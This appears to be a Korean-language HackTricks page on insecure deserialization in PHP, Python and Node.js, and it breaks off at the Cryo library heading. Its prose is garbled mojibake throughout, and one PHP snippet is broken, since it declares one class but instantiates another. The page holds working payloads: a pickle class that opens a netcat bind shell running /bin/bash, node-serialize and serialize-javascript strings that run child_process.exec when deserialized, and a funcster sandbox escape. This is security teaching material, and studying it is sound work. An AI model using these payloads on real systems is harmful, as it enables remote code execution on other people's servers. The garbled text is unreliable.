# ì—­ì§ë ¬í™”

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ **ì œë¡œ**ë¶€í„° **íˆì–´ë¡œ**ë¡œ **AWS í•´í‚¹**ì„ ë°°ìš°ì„¸ìš”!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ **í•˜ê±°ë‚˜ **PDFë¡œ HackTricks ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [**ë””ìŠ¤ì½”ë“œ ê·¸ë£¹**](https://discord.gg/hRep4RUj7f)ì— ê°€ì…í•˜ê±°ë‚˜ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜** íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´ PRì„ ì œì¶œí•˜ì—¬** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— ì œì¶œí•˜ì„¸ìš”.

</details>

## ê¸°ë³¸ ì •ë³´

**ì§ë ¬í™”**ëŠ” ê°ì²´ë¥¼ ë³´ì¡´í•  ìˆ˜ ìˆëŠ” í˜•ì‹ìœ¼ë¡œ ë³€í™˜í•˜ëŠ” ë°©ë²•ìœ¼ë¡œ ì´í•´ë©ë‹ˆë‹¤. ê°ì²´ë¥¼ ì €ì¥í•˜ê±°ë‚˜ í†µì‹  í”„ë¡œì„¸ìŠ¤ì˜ ì¼ë¶€ë¡œ ì „ì†¡í•˜ê¸° ìœ„í•œ ëª©ì ìœ¼ë¡œ ì‚¬ìš©ë©ë‹ˆë‹¤. ì´ ê¸°ìˆ ì€ ê°ì²´ê°€ ë‚˜ì¤‘ì— ì¬ìƒì„±ë  ìˆ˜ ìˆë„ë¡ ë³´ì¥í•˜ê¸° ìœ„í•´ ì¼ë°˜ì ìœ¼ë¡œ ì‚¬ìš©ë©ë‹ˆë‹¤.

**ì—­ì§ë ¬í™”**ëŠ” ì§ë ¬í™”ì˜ ë°˜ëŒ€ ê³¼ì •ì…ë‹ˆë‹¤. íŠ¹ì • í˜•ì‹ìœ¼ë¡œ êµ¬ì¡°í™”ëœ ë°ì´í„°ë¥¼ ê°€ì ¸ì™€ ê°ì²´ë¡œ ë‹¤ì‹œ êµ¬ì„±í•˜ëŠ” ê³¼ì •ì„ í¬í•¨í•©ë‹ˆë‹¤.

ì—­ì§ë ¬í™”ëŠ” ì ì¬ì ìœ¼ë¡œ **ê³µê²©ìê°€ ì§ë ¬í™”ëœ ë°ì´í„°ë¥¼ ì¡°ì‘í•˜ì—¬ í•´ë¡œìš´ ì½”ë“œë¥¼ ì‹¤í–‰**í•˜ê±°ë‚˜ ê°ì²´ ì¬êµ¬ì„± í”„ë¡œì„¸ìŠ¤ ì¤‘ì— ì‘ìš© í”„ë¡œê·¸ë¨ì—ì„œ ì˜ˆê¸°ì¹˜ ì•Šì€ ë™ì‘ì„ ìœ ë°œí•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì— ìœ„í—˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## PHP

PHPì—ì„œëŠ” ì§ë ¬í™” ë° ì—­ì§ë ¬í™” í”„ë¡œì„¸ìŠ¤ ì¤‘ì— íŠ¹ì • ë§¤ì§ ë©”ì„œë“œê°€ ì‚¬ìš©ë©ë‹ˆë‹¤:

* `__sleep`: ê°ì²´ê°€ ì§ë ¬í™”ë  ë•Œ í˜¸ì¶œë©ë‹ˆë‹¤. ì´ ë©”ì„œë“œëŠ” ì§ë ¬í™”í•´ì•¼ í•˜ëŠ” ê°ì²´ì˜ ëª¨ë“  ì†ì„± ì´ë¦„ìœ¼ë¡œ êµ¬ì„±ëœ ë°°ì—´ì„ ë°˜í™˜í•´ì•¼ í•©ë‹ˆë‹¤. ë³´ë¥˜ ì¤‘ì¸ ë°ì´í„°ë¥¼ ì»¤ë°‹í•˜ê±°ë‚˜ ìœ ì‚¬í•œ ì •ë¦¬ ì‘ì—…ì„ ìˆ˜í–‰í•˜ëŠ” ë° ì¼ë°˜ì ìœ¼ë¡œ ì‚¬ìš©ë©ë‹ˆë‹¤.
* `__wakeup`: ê°ì²´ê°€ ì—­ì§ë ¬í™”ë  ë•Œ í˜¸ì¶œë©ë‹ˆë‹¤. ì§ë ¬í™” ì¤‘ì— ì†ì‹¤ëœ ë°ì´í„°ë² ì´ìŠ¤ ì—°ê²°ì„ ë‹¤ì‹œ ì„¤ì •í•˜ê³  ë‹¤ë¥¸ ì´ˆê¸°í™” ì‘ì—…ì„ ìˆ˜í–‰í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤.
* `__unserialize`: ê°ì²´ê°€ ì—­ì§ë ¬í™”ë  ë•Œ (ì¡´ì¬í•˜ëŠ” ê²½ìš°) `__wakeup` ëŒ€ì‹  í˜¸ì¶œë©ë‹ˆë‹¤. `__wakeup`ì— ë¹„í•´ ì—­ì§ë ¬í™” í”„ë¡œì„¸ìŠ¤ì— ëŒ€í•´ ë” ë§ì€ ì œì–´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.
* `__destruct`: ê°ì²´ê°€ ì†Œë©¸ë˜ê±°ë‚˜ ìŠ¤í¬ë¦½íŠ¸ê°€ ì¢…ë£Œë  ë•Œ í˜¸ì¶œë©ë‹ˆë‹¤. íŒŒì¼ í•¸ë“¤ì„ ë‹«ê±°ë‚˜ ë°ì´í„°ë² ì´ìŠ¤ ì—°ê²°ì„ ì¢…ë£Œí•˜ëŠ” ë“± ì •ë¦¬ ì‘ì—…ì— ì¼ë°˜ì ìœ¼ë¡œ ì‚¬ìš©ë©ë‹ˆë‹¤.
* `__toString`: ê°ì²´ë¥¼ ë¬¸ìì—´ë¡œ ì²˜ë¦¬í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤. íŒŒì¼ì„ ì½ê±°ë‚˜ í•´ë‹¹ ë‚´ë¶€ì˜ í•¨ìˆ˜ í˜¸ì¶œì— ê¸°ë°˜í•œ ê¸°íƒ€ ì‘ì—…ì— ì‚¬ìš©ë  ìˆ˜ ìˆìœ¼ë©° ê°ì²´ì˜ í…ìŠ¤íŠ¸ í‘œí˜„ì„ ì œê³µí•©ë‹ˆë‹¤.
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
ë§Œì•½ ê²°ê³¼ë¥¼ ì‚´í´ë³´ë©´ ê°ì²´ê°€ ì—­ì§ë ¬í™”ë  ë•Œ í•¨ìˆ˜ **`__wakeup`**ê³¼ **`__destruct`**ê°€ í˜¸ì¶œëœë‹¤ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì—¬ëŸ¬ íŠœí† ë¦¬ì–¼ì—ì„œëŠ” ì–´ë–¤ ì†ì„±ì„ ì¶œë ¥í•˜ë ¤ê³  í•  ë•Œ **`__toString`** í•¨ìˆ˜ê°€ í˜¸ì¶œëœë‹¤ê³  ì„¤ëª…ë˜ì–´ ìˆì§€ë§Œ, í˜„ì¬ëŠ” ê·¸ë ‡ì§€ ì•Šì€ ê²ƒìœ¼ë¡œ ë³´ì…ë‹ˆë‹¤.

{% hint style="warning" %}
í´ë˜ìŠ¤ì— êµ¬í˜„ëœ ê²½ìš° **`__unserialize(array $data)`** ë©”ì†Œë“œê°€ **`__wakeup()` ëŒ€ì‹  í˜¸ì¶œ**ë©ë‹ˆë‹¤. ì´ ë©”ì†Œë“œë¥¼ ì‚¬ìš©í•˜ì—¬ ì§ë ¬í™”ëœ ë°ì´í„°ë¥¼ ë°°ì—´ë¡œ ì œê³µí•˜ì—¬ ê°ì²´ë¥¼ ì—­ì§ë ¬í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ë©”ì†Œë“œë¥¼ ì‚¬ìš©í•˜ì—¬ ì†ì„±ì„ ì—­ì§ë ¬í™”í•˜ê³  ì—­ì§ë ¬í™” ì‹œ í•„ìš”í•œ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```php
class MyClass {
private $property;

public function __unserialize(array $data): void {
$this->property = $data['property'];
// Perform any necessary tasks upon deserialization.
}
}
```
{% endhint %}

**PHP ì˜ˆì œë¥¼ ì—¬ê¸°ì—ì„œ ì„¤ëª…ì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤**: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), ì—¬ê¸° [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) ë˜ëŠ” ì—¬ê¸° [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload Classes

PHP autoload ê¸°ëŠ¥ì„ ì•…ìš©í•˜ì—¬ ì„ì˜ì˜ php íŒŒì¼ì„ ë¡œë“œí•˜ê³  ë” ë§ì€ ì‘ì—…ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="php-deserialization-+-autoload-classes.md" %}
[php-deserialization-+-autoload-classes.md](php-deserialization-+-autoload-classes.md)
{% endcontent-ref %}

### ì°¸ì¡° ê°’ ì§ë ¬í™”

ì–´ë–¤ ì´ìœ ë¡œë“  ê°’ì´ **ë‹¤ë¥¸ ê°’ì— ëŒ€í•œ ì°¸ì¡°ë¡œ ì§ë ¬í™”**ë˜ê¸¸ ì›í•œë‹¤ë©´:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHPGGC (PHPìš© ysoserial)

[**PHPGGC**](https://github.com/ambionics/phpggc)ì€ PHP ì§ë ¬í™”ë¥¼ ì•…ìš©í•˜ê¸° ìœ„í•œ payloadë¥¼ ìƒì„±í•˜ëŠ” ë° ë„ì›€ì´ ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì—¬ëŸ¬ ê²½ìš°ì—ëŠ” ì‘ìš© í”„ë¡œê·¸ë¨ì˜ ì†ŒìŠ¤ ì½”ë“œì—ì„œ ì§ë ¬í™”ë¥¼ ì•…ìš©í•  ë°©ë²•ì„ ì°¾ì„ ìˆ˜ ì—†ì„ ìˆ˜ ìˆì§€ë§Œ **ì™¸ë¶€ PHP í™•ì¥ í”„ë¡œê·¸ë¨ì˜ ì½”ë“œë¥¼ ì•…ìš©í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.**\
ë”°ë¼ì„œ ê°€ëŠ¥í•˜ë‹¤ë©´ ì„œë²„ì˜ `phpinfo()`ë¥¼ í™•ì¸í•˜ê³  **ì¸í„°ë„·ì—ì„œ** (ë˜ëŠ” **PHPGGCì˜ ê°€ì ¯**ì—ì„œ) ì•…ìš©í•  ìˆ˜ ìˆëŠ” ê°€ëŠ¥í•œ ê°€ì ¯ì„ ì°¾ì•„ë³´ì„¸ìš”.

### phar:// ë©”íƒ€ë°ì´í„° ì§ë ¬í™”

íŒŒì¼ì„ ì½ê³  ê·¸ ì•ˆì— ìˆëŠ” PHP ì½”ë“œë¥¼ ì‹¤í–‰í•˜ì§€ ì•ŠëŠ” LFIë¥¼ ë°œê²¬í–ˆë‹¤ë©´, ì˜ˆë¥¼ ë“¤ì–´ _**file\_get\_contents(), fopen(), file() ë˜ëŠ” file\_exists(), md5\_file(), filemtime() ë˜ëŠ” filesize()**_ì™€ ê°™ì€ í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²½ìš°ì…ë‹ˆë‹¤. **íŒŒì¼**ì„ **ì½ì„ ë•Œ** ë°œìƒí•˜ëŠ” **ì§ë ¬í™”**ë¥¼ ì•…ìš©í•´ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ìì„¸í•œ ì •ë³´ëŠ” ë‹¤ìŒ ê²Œì‹œë¬¼ì„ ì°¸ì¡°í•˜ì„¸ìš”:

{% content-ref url="../file-inclusion/phar-deserialization.md" %}
[phar-deserialization.md](../file-inclusion/phar-deserialization.md)
{% endcontent-ref %}

## Python

### **Pickle**

ê°ì²´ê°€ ì–¸í”¼í´ë  ë•Œ í•¨ìˆ˜ _\_\_reduce\_\__ê°€ ì‹¤í–‰ë©ë‹ˆë‹¤.\
ì•…ìš©ë˜ë©´ ì„œë²„ê°€ ì˜¤ë¥˜ë¥¼ ë°˜í™˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
**Pickle jails**ë¡œë¶€í„° íƒˆì¶œí•˜ëŠ” ë” ë§ì€ ì •ë³´ë¥¼ í™•ì¸í•˜ë ¤ë©´:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Yaml **&** jsonpickle

ë‹¤ìŒ í˜ì´ì§€ëŠ” **yamls** íŒŒì´ì¬ ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ì„œì˜ **ì•ˆì „í•˜ì§€ ì•Šì€ ì—­ì§ë ¬í™”ë¥¼ ë‚¨ìš©í•˜ëŠ” ê¸°ìˆ **ì„ ì†Œê°œí•˜ê³ , **Pickle, PyYAML, jsonpickle ë° ruamel.yaml**ì— ëŒ€í•œ RCE ì—­ì§ë ¬í™” í˜ì´ë¡œë“œë¥¼ ìƒì„±í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ë„êµ¬ë¡œ ë§ˆë¬´ë¦¬ë©ë‹ˆë‹¤:

{% content-ref url="python-yaml-deserialization.md" %}
[python-yaml-deserialization.md](python-yaml-deserialization.md)
{% endcontent-ref %}

### Class Pollution (Python Prototype Pollution)

{% content-ref url="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md" %}
[class-pollution-pythons-prototype-pollution.md](../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md)
{% endcontent-ref %}

## NodeJS

### JS Magic Functions

JSì—ëŠ” PHPë‚˜ Pythonê³¼ ê°™ì´ **"ë§¤ì§" í•¨ìˆ˜**ê°€ ì—†ìŠµë‹ˆë‹¤. ì´ í•¨ìˆ˜ë“¤ì€ ê°ì²´ë¥¼ ìƒì„±í•  ë•Œ ì‹¤í–‰ë©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ **`toString`**, **`valueOf`**, **`toJSON`**ê³¼ ê°™ì´ **ì§ì ‘ í˜¸ì¶œí•˜ì§€ ì•Šì•„ë„ ìì£¼ ì‚¬ìš©ë˜ëŠ” í•¨ìˆ˜**ê°€ ìˆìŠµë‹ˆë‹¤.\
ì—­ì§ë ¬í™”ë¥¼ ë‚¨ìš©í•˜ë©´ ì´ëŸ¬í•œ í•¨ìˆ˜ë“¤ì„ **íƒ€ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ë„ë¡ ì†ìƒì‹œí‚¬ ìˆ˜ ìˆìœ¼ë©°**(ì›í˜• ì˜¤ì—¼ì„ ë‚¨ìš©í•  ìˆ˜ ìˆìŒ), í˜¸ì¶œë  ë•Œ ì„ì˜ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë‹¤ë¥¸ **í•¨ìˆ˜ë¥¼ ì§ì ‘ í˜¸ì¶œí•˜ì§€ ì•Šê³ ** í˜¸ì¶œí•˜ëŠ” **"ë§¤ì§" ë°©ë²•**ì€ **ë¹„ë™ê¸° í•¨ìˆ˜**(í”„ë¡œë¯¸ìŠ¤)ì—ì„œ ë°˜í™˜ëœ ê°ì²´ë¥¼ **ì†ìƒì‹œí‚¤ëŠ” ê²ƒ**ì…ë‹ˆë‹¤. ì™œëƒí•˜ë©´, ê·¸ **ë°˜í™˜ ê°ì²´**ë¥¼ ë‹¤ë¥¸ **í”„ë¡œë¯¸ìŠ¤**ë¡œ **ë³€í™˜**í•˜ë©´ **í•¨ìˆ˜ ìœ í˜•ì˜ "then"**ì´ë¼ëŠ” **ì†ì„±**ì„ ê°€ì§„ **í”„ë¡œë¯¸ìŠ¤**ê°€ ë‹¤ë¥¸ í”„ë¡œë¯¸ìŠ¤ì— ì˜í•´ ë°˜í™˜ë˜ì—ˆê¸° ë•Œë¬¸ì— **ì‹¤í–‰**ë  ê²ƒì…ë‹ˆë‹¤. _ìì„¸í•œ ì •ë³´ëŠ”_ [_**ì´ ë§í¬**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _ë¥¼ ì°¸ì¡°í•˜ì‹­ì‹œì˜¤._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise(resolve => {
console.log('hello')
resolve()
})
return p
}

async function test_then() {
const p = new Promise(then => {
console.log('hello')
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` ë° `prototype` ì˜¤ì—¼

ë§Œì•½ ì´ ê¸°ìˆ ì— ëŒ€í•´ ì•Œê³  ì‹¶ë‹¤ë©´ **ë‹¤ìŒ íŠœí† ë¦¬ì–¼ì„ í™•ì¸í•˜ì„¸ìš”**:

{% content-ref url="nodejs-proto-prototype-pollution/" %}
[nodejs-proto-prototype-pollution](nodejs-proto-prototype-pollution/)
{% endcontent-ref %}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

ì´ ë¼ì´ë¸ŒëŸ¬ë¦¬ëŠ” í•¨ìˆ˜ë¥¼ ì§ë ¬í™”í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤. ì˜ˆì‹œ:
```javascript
var y = {
"rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```
**ì§ë ¬í™”ëœ ê°ì²´**ëŠ” ë‹¤ìŒê³¼ ê°™ì´ ë³´ì¼ ê²ƒì…ë‹ˆë‹¤:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
ì˜ˆì œì—ì„œ í•¨ìˆ˜ê°€ ì§ë ¬í™”ë  ë•Œ `_$$ND_FUNC$$_` í”Œë˜ê·¸ê°€ ì§ë ¬í™”ëœ ê°ì²´ì— ì¶”ê°€ëœë‹¤ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

`node-serialize/lib/serialize.js` íŒŒì¼ ë‚´ë¶€ì—ì„œ ë™ì¼í•œ í”Œë˜ê·¸ì™€ ì½”ë“œê°€ ì–´ë–»ê²Œ ì‚¬ìš©ë˜ëŠ”ì§€ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![](<../../.gitbook/assets/image (351).png>)

![](<../../.gitbook/assets/image (446).png>)

ë§ˆì§€ë§‰ ì½”ë“œ ì²­í¬ì—ì„œ ë³¼ ìˆ˜ ìˆë“¯ì´, **í”Œë˜ê·¸ê°€ ë°œê²¬ë˜ë©´** `eval`ì´ ì‚¬ìš©ë˜ì–´ í•¨ìˆ˜ë¥¼ ì—­ì§ë ¬í™”í•˜ë¯€ë¡œ ê¸°ë³¸ì ìœ¼ë¡œ **ì‚¬ìš©ì ì…ë ¥ì´ `eval` í•¨ìˆ˜ ë‚´ë¶€ì—ì„œ ì‚¬ìš©**ë©ë‹ˆë‹¤.

ê·¸ëŸ¬ë‚˜ í•¨ìˆ˜ë¥¼ **ë‹¨ìˆœíˆ ì§ë ¬í™”**í•˜ëŠ” ê²ƒë§Œìœ¼ë¡œëŠ” ì‹¤í–‰ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ ì½”ë“œì˜ ì¼ë¶€ê°€ **`y.rce`ë¥¼ í˜¸ì¶œ**í•´ì•¼ í•˜ë©°, ì´ëŠ” ë§¤ìš° **ê°€ëŠ¥ì„±ì´ ë‚®ìŠµë‹ˆë‹¤**.\
ì–´ì¨Œë“ , ì§ë ¬í™”ëœ ê°ì²´ë¥¼ **ìˆ˜ì •í•˜ì—¬ ê´„í˜¸ë¥¼ ì¶”ê°€**í•˜ì—¬ ê°ì²´ê°€ ì—­ì§ë ¬í™”ë  ë•Œ ì§ë ¬í™”ëœ í•¨ìˆ˜ê°€ ìë™ìœ¼ë¡œ ì‹¤í–‰ë˜ë„ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ë‹¤ìŒ ì½”ë“œ ì²­í¬ì—ì„œ **ë§ˆì§€ë§‰ ê´„í˜¸**ë¥¼ ì£¼ëª©í•˜ê³  `unserialize` í•¨ìˆ˜ê°€ ì½”ë“œë¥¼ ìë™ìœ¼ë¡œ ì‹¤í–‰í•˜ëŠ” ë°©ë²•ì„ í™•ì¸í•˜ì„¸ìš”:
```javascript
var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
```
ìœ„ì—ì„œ ì–¸ê¸‰í–ˆë“¯ì´, ì´ ë¼ì´ë¸ŒëŸ¬ë¦¬ëŠ” `_$$ND_FUNC$$_` ì´í›„ì˜ ì½”ë“œë¥¼ ê°€ì ¸ì™€ì„œ `eval`ì„ ì‚¬ìš©í•˜ì—¬ **ì‹¤í–‰**í•©ë‹ˆë‹¤. ë”°ë¼ì„œ **ì½”ë“œë¥¼ ìë™ìœ¼ë¡œ ì‹¤í–‰**í•˜ê¸° ìœ„í•´ **í•¨ìˆ˜ ìƒì„± ë¶€ë¶„ì„ ì‚­ì œ**í•˜ê³  ë§ˆì§€ë§‰ ê´„í˜¸ë¥¼ ì‚­ì œí•˜ê³  ë‹¤ìŒ ì˜ˆì œì™€ ê°™ì´ **JS ì›ë¼ì´ë„ˆë¥¼ ì‹¤í–‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```javascript
var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
```
ë‹¤ìŒì—ì„œ ì´ ì·¨ì•½ì ì„ ì–´ë–»ê²Œ ì•…ìš©í•˜ëŠ”ì§€ì— ëŒ€í•œ **ì¶”ê°€ ì •ë³´**ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤: [**ì—¬ê¸°**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/).

### [funcster](https://www.npmjs.com/package/funcster)

**funcster**ì˜ ì£¼ëª©í• ë§Œí•œ ì¸¡ë©´ì€ **í‘œì¤€ ë‚´ì¥ ê°ì²´ì— ëŒ€í•œ ì ‘ê·¼ ë¶ˆê°€ëŠ¥**; ì´ë“¤ì€ ì ‘ê·¼ ê°€ëŠ¥í•œ ë²”ìœ„ë¥¼ ë²—ì–´ë‚©ë‹ˆë‹¤. ì´ ì œí•œìœ¼ë¡œ ì¸í•´ ë‚´ì¥ ê°ì²´ì˜ ë©”ì†Œë“œë¥¼ í˜¸ì¶œí•˜ë ¤ëŠ” ì½”ë“œ ì‹¤í–‰ì´ ë°©ì§€ë˜ì–´ `console.log()` ë˜ëŠ” `require(something)`ê³¼ ê°™ì€ ëª…ë ¹ì„ ì‚¬ìš©í•  ë•Œ `"ReferenceError: console is not defined"`ê³¼ ê°™ì€ ì˜ˆì™¸ê°€ ë°œìƒí•©ë‹ˆë‹¤.

ê·¸ëŸ¬ë‚˜ ì´ ì œí•œì„ ìš°íšŒí•˜ëŠ” ê²ƒì´ ê°€ëŠ¥í•©ë‹ˆë‹¤. íŠ¹ì • ì ‘ê·¼ ë°©ì‹ì„ í†µí•´ ì „ì—­ ì»¨í…ìŠ¤íŠ¸ë¡œì˜ ì™„ì „í•œ ì•¡ì„¸ìŠ¤ ë³µì›ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤. ì „ì—­ ì»¨í…ìŠ¤íŠ¸ë¥¼ ì§ì ‘ í™œìš©í•˜ì—¬ ì´ ì œí•œì„ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ë‹¤ìŒ ìŠ¤ë‹ˆí«ì„ ì‚¬ìš©í•˜ì—¬ ì•¡ì„¸ìŠ¤ë¥¼ ë‹¤ì‹œ ì„¤ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```javascript
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```
**ë” ë§ì€ ì •ë³´ë¥¼ ì›í•˜ì‹œë©´ [ì´ ì†ŒìŠ¤ë¥¼ ì½ì–´ë³´ì„¸ìš”](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

**serialize-javascript** íŒ¨í‚¤ì§€ëŠ” ì˜¤ë¡œì§€ ì§ë ¬í™” ëª©ì ìœ¼ë¡œ ì„¤ê³„ë˜ì—ˆìœ¼ë©° ë‚´ì¥ ì—­ì§ë ¬í™” ê¸°ëŠ¥ì´ ì—†ìŠµë‹ˆë‹¤. ì‚¬ìš©ìëŠ” ìì²´ ì—­ì§ë ¬í™” ë°©ë²•ì„ êµ¬í˜„í•´ì•¼ í•©ë‹ˆë‹¤. ì§ë ¬í™”ëœ ë°ì´í„°ë¥¼ ì—­ì§ë ¬í™”í•˜ëŠ” ê³µì‹ ì˜ˆì œì—ì„œëŠ” `eval`ì˜ ì§ì ‘ì ì¸ ì‚¬ìš©ì´ ì œì•ˆë©ë‹ˆë‹¤:
```javascript
function deserialize(serializedJavascript){
return eval('(' + serializedJavascript + ')');
}
```
ë§Œì•½ ì´ í•¨ìˆ˜ê°€ ê°ì²´ë¥¼ ì—­ì§ë ¬í™”í•˜ëŠ” ë° ì‚¬ìš©ëœë‹¤ë©´, **ì‰½ê²Œ ì•…ìš©**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```javascript
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**ë” ë§ì€ ì •ë³´ë¥¼ ì›í•˜ì‹œë©´** [**ì´ ì†ŒìŠ¤ë¥¼ ì½ì–´ë³´ì„¸ìš”**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Cryo ë¼ì´ë¸ŒëŸ¬ë¦¬

ë‹¤ìŒ í˜ì´ì§€ì—ì„œëŠ” ì´ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ë‚¨ìš©í•˜ì—¬ ì„ì˜ì˜ ëª…ë ¹ì„ ì‹¤í–‰í•˜ëŠ” ë°©ë²•ì— ëŒ€í•œ ì •ë³´ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

